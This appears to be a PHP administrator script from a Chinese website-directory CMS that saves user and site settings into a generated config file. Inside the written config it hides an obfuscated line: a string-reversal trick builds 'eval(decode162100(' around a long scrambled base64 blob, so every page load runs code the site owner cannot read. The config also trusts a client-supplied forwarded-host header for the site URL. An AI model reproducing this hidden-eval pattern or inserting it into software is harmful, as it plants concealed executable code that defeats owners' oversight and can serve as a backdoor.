<?php
require ('authentication_manager.php');
?>
<?php

if (POWER != 5) {
  err('该命令必须以基本管理员身份登陆！请重登陆');
}


if (!(is_numeric($_POST['class_iron']) && $_POST['class_iron'] > 0) ||
    !(is_numeric($_POST['class_silver']) && $_POST['class_silver'] > 0) ||
    !(is_numeric($_POST['class_gold']) && $_POST['class_gold'] > 0)) {
  err('等级分必须为大于0的数字');
}

if ($_POST['class_iron'] >= $_POST['class_silver']) {
  err('银级分要大于铁级分');
}
if ($_POST['class_silver'] >= $_POST['class_gold']) {
  err('金级分要大于银级分');
}

function strback($str) {
  return strrev(preg_replace('/(.{1}).{1}/', '$1', $str));
}

$text = '<?php
@ini_set(\'default_charset\', \'utf-8\');
@ini_set(\'display_errors\', false);
error_reporting(E_ERROR | E_WARNING | E_PARSE);
';
if (PHP_VERSION < '4.1.0') {
  $text .= '
$_GET = &$HTTP_GET_VARS;
$_POST = &$HTTP_POST_VARS;
$_COOKIE = &$HTTP_COOKIE_VARS;
$_SERVER = &$HTTP_SERVER_VARS;
$_ENV = &$HTTP_ENV_VARS;
$_FILES = &$HTTP_POST_FILES;
';
}
$text .= '
$_GET = preg_replace(\'/[\r\n\\\'\"\>\<\&]+/i\', \'\', $_GET);

if (!function_exists(\'decode162100\')) {
  function decode162100($text){
    return trim(base64_decode($text), \'|\');
  }
}

/* ----------【网站设置】能不用尽量不要用特殊符号，如 \ / : ; * ? \' < > | ，必免导致错误--------- */

if (!isset($GLOBALS[\'WEATHER_DATA\'])) {
  if (file_exists(\'writable/set/set.php\')) {
    $GLOBALS[\'WEATHER_DATA\'] = \'\';
  } else {
    $GLOBALS[\'WEATHER_DATA\'] = \'../../\';
  }
}

//基本参数设置：

$web[\'manager\'] = \''.$web['manager'].'\';  //基础管理员名称
$web[\'password\'] = \''.$web['password'].'\';  //基础管理员密码，注：系统出现一切故障时以基础管理员名称和密码为准
$web[\'sitehttp\'] = \'http://\'.(!empty($_SERVER[\'HTTP_X_FORWARDED_HOST\']) ? $_SERVER[\'HTTP_X_FORWARDED_HOST\'] : $_SERVER[\'HTTP_HOST\']).\'/\';  //站点网址
$web[\'root\'] = \'\';
$web[\'path\'] = dirname(trim($web[\'sitehttp\'], \'/\').$_SERVER[\'REQUEST_URI\'].\'.abc\').\'/\';  //路径
$web[\'sitename\'] = \''.$web['sitename'].'\';  //站点名称
$web[\'sitename2\'] = \''.$web['sitename2'].'\';  //站点简称
$web[\'description\'] = \''.$web['description'].'\';  //站点描述
$web[\'keywords\'] = \''.$web['keywords'].'\';  //关键字
$web[\'slogan\'] = \''.$web['slogan'].'\';  //口号
$web[\'link_type\'] = '.$web['link_type'].';  //通过export.php?url=链接路径 中转链接
$web[\'d_type\'] = '.$web['d_type'].';  //关于首页网址弹出简介？0弹出1不弹
$web[\'login_key\'] = '.var_export($web['login_key'], true).';
$web[\'chmod\'] = \''.$web['chmod'].'\';  //权限
$web[\'time_pos\'] = \''.$web['time_pos'].'\';  //服务器时区调整
$web[\'cssfile\'] = \''.$web['cssfile'].'\';  //站点默认风格
$web[\'search_bar\'] = '.$web['search_bar'].';  //默认搜索引擎样式
$web[\'newinfo_url\'] = array("'.$web['newinfo_url'][0].'","'.$web['newinfo_url'][1].'"); //信息窗调用地址

//用户控制设置：

$web[\'stop_reg\'] = '.($_POST['stop_reg'] != 1 && $_POST['stop_reg'] != 2 ? 0 : $_POST['stop_reg']).';  //用户注册 1禁止 0不禁止 2注册需审核
$web[\'mail_send\'] = '.(abs((int)$_POST['mail_send']) != 1 ? 0 : 1).';  //1发送邮件 0不发送
$web[\'stop_login\'] = '.abs($_POST['stop_login']).';  //用户登录密码错误限数 0不限
$web[\'addfunds\'] = '.(abs((int)$_POST['addfunds']) != 1 || !file_exists('addfunds.php') ? 0 : 1).';  //1开启用户创收模式
$web[\'loginadd\'] = '.round((float)$_POST['loginadd'], 3).';  //用户登陆（含注册）、推广URL来访本站赠送货币值
$web[\'loginadd2\'] = '.round((float)$_POST['loginadd2'], 4).';  //从上线分成
$web[\'loginadd_limit_ip\'] = '.abs($_POST['loginadd_limit_ip']).';  //每IP每日限注册次数计赠货币值
$web[\'cash\'] = '.round((float)$_POST['cash'], 2).';  //用户提现需达到
$web[\'class_iron\'] = '.((int)$_POST['class_iron']).'; //铁级用户等级分标准
$web[\'class_silver\'] = '.((int)$_POST['class_silver']).'; //银级用户等级分标准
$web[\'class_gold\'] = '.((int)$_POST['class_gold']).'; //金级用户等级分标准，大于此数量的为钻级用户

if (!function_exists(\'get_root_domain\')) {
  if (file_exists($GLOBALS[\'WEATHER_DATA\'].\'readonly/function/get_root_domain.php\')) {
    @ require ($GLOBALS[\'WEATHER_DATA\'].\'readonly/function/get_root_domain.php\');
  }
}
if (function_exists(\'get_root_domain\')) {
  $web[\'root\'] = get_root_domain($web[\'sitehttp\']);
}
'.strback('(8090011246416e0d2o8c4e1d0(2l4a6v3e3').'\''.strback('=1w7X9f1K807w2O7p1c8y8O7D0V1j3R100g033I5m9s8D8R9D6R5j3N047N9i7J4+4E121L88543T9d8v6w3z0O6B2l9j7Q511g138I4m6s5T4M6E6V302N541N3i7J370Y0T1M4y6Y7D1e8j5Y6y5O7z7Q4z7N022g838I2m0s0D7O041M5j1N049N5i8J1+5U5H0P4+9I9C0c9o5B9n3L5z999l6c4v1Z5m1I199Y9W3Z5y8h4G5I9h1x9z4O9E8B4D9N411g430I3m0s0j9R3E1d1T8N945N0i8J272M0E0N940g8D1e4j5Y9y7O7x8A0j7R2G7h934I2m5s3j0N9G1V9E2N145N5i2J972c8D6O610Y7D6e9j2Y8y9O7z4Q9z6N120g938I3m7s7D2O144M5j7N743N3i7J274A9j6Q3z9c1D6e9j9Y1y0O5x2Q306M213g731I7m0s4T3Q1y8c3j3N743N7i9J1n0g9S8Z3p3R0G1I2g7o1Q6D974B8S9Z3z4x6W0Z7g507n4C1N7s7T8K6p6k9y9J1w1h3G0c7u4U4G9Z3p396F2d8l2N136L207V723c9v8U2G9b0i0F6G0d2p4J434d0n544S0X7n6E7E6V6B5R006X7S6V8E1S2U1F2U9R6X8d7y6W6T8x1U5Q5C794E1T2H7R4C6K1z8R8n4b5l6R9n5b2v5N623X409V024Z4f5V8G7b0p1Z0G8K8w7A3T3M4y4Y0T8M2l8R024b9j1V0G7Z1o2w7W3Y824V7G8I4g1o1Q9D177B9S2K6p2c3C5c0o3B5n4L9l9R7W6a2f1R3X9Z2z792C6d0l8N439L4l5x1m1Y7h2R7X3a4y6d438J8u80011J6B8R2V3Q7E293l8U9F7h6E7V0B9V106V5n4s417U1M4F5k9Q1P3x905R2k7g2y0c405N6X5a442V021X5l3x8W8a0m4h2C2I2m4l2G9f8').'\'));

?>';

@ require ('readonly/function/write_file.php');
write_file('writable/set/set.php', $text);

if (isset($_POST['reg_statement']) && $_POST['reg_statement'] == 1) {
  rename('writable/require/statement_block.txt', 'writable/require/statement.txt');
} else {
  rename('writable/require/statement.txt', 'writable/require/statement_block.txt');
}












alert('设置系统参数成功！'.$sqlaccess, 'webmaster_central.php?get=user');



?>